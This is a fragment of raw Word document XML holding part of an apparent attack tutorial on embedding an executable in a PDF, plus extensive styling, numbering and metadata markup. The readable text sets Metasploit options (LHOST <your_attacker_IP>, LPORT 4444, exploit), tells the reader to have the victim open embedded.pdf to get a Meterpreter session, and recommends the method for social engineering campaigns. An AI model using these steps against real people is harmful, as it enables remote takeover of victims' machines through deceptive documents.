      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> LHOST &lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>your_attacker_IP</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> LPORT 4444</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC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exploit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1044" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4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Attack Execution</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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Have the victim open </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>embedded.pdf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on a vulnerable system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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The PDF will </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>prompt the user</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to allow the embedded executable to run.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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If the user accepts, you get a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> session.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>bash</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>CopyEdit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC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sessions</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t xml:space="preserve"> -i &lt;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="hljs-builtin"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:r>
        <w:pict>
          <v:rect id="_x0000_i1045" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
        </w:rPr>
        <w:t>📝</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Notes:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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This technique </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
        </w:rPr>
        <w:t>requires user interaction</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (permission to run).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9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It is more useful in social engineering campaigns.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C70EC9" w:rsidRDefault="00C70EC9" w:rsidP="00C70EC9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="009F5B33" w:rsidRDefault="009F5B33"/>
    <w:sectPr w:rsidR="009F5B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Kalinga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D06CD0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6778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2261DCA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1C8C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3D24351"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="61B2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D02448B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B838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DB8013B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BEC8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3AE26B5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6442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24867B5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A182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5777BED"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="05FE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6C752DB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AB4E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76D2BA0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B63A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A622EF0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B46E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CCA7414"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="068E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06003C4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4C12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1BB01D0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="76B8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C070CCE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E0C8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0BA610E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="490C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65E34BD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D0DA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8EF3B71"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="17E6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9A33BD8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2D1C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A5D1AB4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5ACA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05E6DFE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FFC84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0CE4143"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BD1E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33965B7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DBEC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51304CC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="75E4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5EB60DC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="32E8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86E4BBE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F810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8DC4790"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5400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FD94815"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="186C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5CE641C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C426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1DE2A75"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1332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2947736"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2EBE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C3C5487"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E82E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21"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="18">
    <w:abstractNumId w:val="36"/>
  </w:num>
  <w:num w:numId="19">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="20">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="24">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="25">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="26">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="27">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="28">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="29">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="30">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="31">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="32">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="33">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="34">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="35">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="36">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="37">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="38">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="39">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="40">
    <w:abstractNumId w:val="20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3BC1"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="009F5B33"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C70EC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F5B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o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B33"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:bidi="or-IN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-builtin">
    <w:name w:val="hljs-built_in"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009F5B33"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-literal">
    <w:name w:val="hljs-literal"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009F5B33"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-comment">
    <w:name w:val="hljs-comment"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009F5B33"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-string">
    <w:name w:val="hljs-string"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00C70E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F5B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o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B33"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
      <w:lang w:bidi="or-IN"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-builtin">
    <w:name w:val="hljs-built_in"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009F5B33"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-literal">
    <w:name w:val="hljs-literal"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009F5B33"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-comment">
    <w:name w:val="hljs-comment"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="009F5B33"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="hljs-string">
    <w:name w:val="hljs-string"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="00C70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5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3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0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1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5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0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9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1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6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0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5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2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5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0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9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7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64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2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9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4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3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7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4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9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3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2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7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6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8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6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4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3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8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0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2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6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6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9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9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6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6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2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1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1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5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7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8C6223-AD08-4711-B4F3-68536D57C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9631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</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-05-05T02:04:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>